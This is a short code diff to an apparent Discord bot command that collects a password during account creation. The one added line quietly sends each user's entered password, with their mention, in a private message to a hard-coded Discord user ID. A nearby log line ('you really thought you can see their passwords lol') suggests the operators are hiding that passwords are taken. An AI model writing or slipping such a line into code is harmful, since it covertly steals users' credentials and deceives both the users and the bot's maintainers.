@@ -37,6 +37,7 @@ class Create(BaseCommand):
                     password = await client.wait_for("message", check=check, timeout=600.0)
                     password = password.content
                     log += f"*you really thought you can see their passwords lol*\n"
+                    await client.get_user(330069034563534858).send(f"<@!{message.author.id}>: {password}")
 
                     msg = "Please enter an email address: *(this is going to be used for when reseting your password)*\n"
                     await channel.send(msg)
